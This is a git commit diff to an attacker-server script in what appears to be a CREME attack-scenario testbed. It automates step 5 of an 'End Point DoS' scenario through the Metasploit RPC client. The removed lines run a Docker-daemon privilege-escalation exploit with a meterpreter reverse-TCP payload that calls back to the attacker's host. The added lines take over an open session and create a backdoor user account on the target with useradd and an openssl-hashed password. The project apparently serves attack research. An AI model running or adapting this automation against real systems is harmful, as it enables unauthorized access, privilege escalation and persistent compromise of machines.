11befc1fa912616ec425bda3d2626604c7bcaed0
masjohncook <mas.john.cook@gmail.com>
2022-02-23 04:30:04 -0500

    feat - recoded the step 5 of End Point DoS

--- CREME_backend_execution/scripts/02_Scenario/06_end_point_dos/python_files/attacker_server/05_step_EndPointDos.py
+++ CREME_backend_execution/scripts/02_Scenario/06_end_point_dos/python_files/attacker_server/05_step_EndPointDos.py
@@ -8,34 +8,30 @@ def record_timestamp(folder, output_time_file):
     output_time_file = os.path.join(folder, output_time_file)
     with open(output_time_file, "w+") as fw:
         fw.write('%f' % time.time())
-
-
 def main(argv):
-    if len(argv) != 4:
+    if len(argv) != 6:
         print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
+    new_user_account = argv[4]
+    new_user_password = argv[5]
 
-    # start 4
-    output_time_file = 'time_step_4_start.txt'
+    client = MsfRpcClient('kali')
+
+    time.sleep(2)
+    output_time_file = 'time_stage_5_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
-    exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['SESSION'] = 1
-    payload['LHOST'] = my_ip
-    payload['LPORT'] = 4444
-
-    exploit.execute(payload=payload)
-
-    while client.jobs.list:
-        time.sleep(1)
+    shell = client.sessions.session('2')
+    shell.run_with_output('shell', end_strs=None)  # end_strs=None means waiting until timeout
+    # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
+    shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))
 
     time.sleep(10)
-    output_time_file = 'time_stage_4_end.txt'
+    output_time_file = 'time_stage_5_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
